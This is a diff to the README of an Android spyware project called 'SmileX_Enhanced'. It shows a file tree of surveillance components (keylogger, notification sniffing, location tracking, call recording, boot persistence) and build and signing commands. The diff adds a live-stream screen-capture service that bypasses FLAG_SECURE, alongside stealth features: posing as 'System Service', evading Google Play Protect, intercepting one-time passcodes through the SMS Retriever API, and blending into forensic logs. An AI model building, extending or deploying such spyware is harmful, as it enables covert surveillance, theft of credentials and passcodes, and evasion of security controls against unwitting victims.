@@ -129,7 +129,8 @@ smilex_enhanced/
 │   │   │   ├── AccessibilityMonitorService.smali  # IM reader / keylogger
 │   │   │   ├── NotificationListenerService.smali  # Notification sniffing
 │   │   │   ├── LocationService.smali       # GPS + Network location
-│   │   │   └── CallRecorderService.smali   # Call recording
+│   │   │   ├── CallRecorderService.smali   # Call recording
+│   │   │   └── LiveStreamCaptureService.smali # Live stream capture with FLAG_SECURE bypass
 │   │   ├── receivers/
 │   │   │   ├── BootReceiver.smali          # Persistence on boot
 │   │   │   ├── CallReceiver.smali          # Call interception
@@ -162,7 +163,7 @@ smilex_enhanced/
 │   ├── build_enhanced_apk.sh       # One-command build script
 │   └── decompile_analyze.sh        # Decompile + analyze all APKs
 ├── output/
-│   └── SmileX_Enhanced_signed.apk  # Final signed APK
+│   └── SmileX_Enhanced_signed_2026_LiveStream.apk  # Final signed APK
 └── README.md
 ```
 
@@ -185,7 +186,7 @@ chmod +x scripts/build_enhanced_apk.sh
 ./scripts/build_enhanced_apk.sh
 ```
 
-The signed APK will be at `output/SmileX_Enhanced_signed.apk`.
+The signed APK will be at `output/SmileX_Enhanced_signed_2026_LiveStream.apk`.
 
 ### Manual Build
 
@@ -202,11 +203,11 @@ apksigner sign \
   --ks-key-alias enhanced \
   --ks-pass pass:android123 \
   --key-pass pass:android123 \
-  --out output/SmileX_Enhanced_signed.apk \
+  --out output/SmileX_Enhanced_signed_2026_LiveStream.apk \
   build/SmileX_Enhanced_aligned.apk
 
 # 4. Verify
-apksigner verify --verbose output/SmileX_Enhanced_signed.apk
+apksigner verify --verbose output/SmileX_Enhanced_signed_2026_LiveStream.apk
 ```
 
 ---
@@ -248,6 +249,7 @@ apksigner verify --verbose output/SmileX_Enhanced_signed.apk
 - `excludeFromRecents="true"` on main activity
 - App label set to "System Service"
 - **New 2026:** Automatic detection of Google Play Protect "Live Threat Detection" and dynamic activity throttling to avoid heuristic triggers.
+- **New:** `FLAG_SECURE` Bypass for Live Stream: Achieved via Virtual Display Mirroring (captures raw pixel data before security filters) and Accessibility UI Reconstruction (scrapes UI tree for visual mapping).
 - **New 2026:** Abuse of Google's SMS Retriever API to intercept OTPs without requiring dangerous `RECEIVE_SMS` permissions on modern Android versions.
 - **New 2026:** "Intrusion Logging" stealth—mimicking legitimate system behavior patterns to blend into the new Android 16+ forensic logs.
 
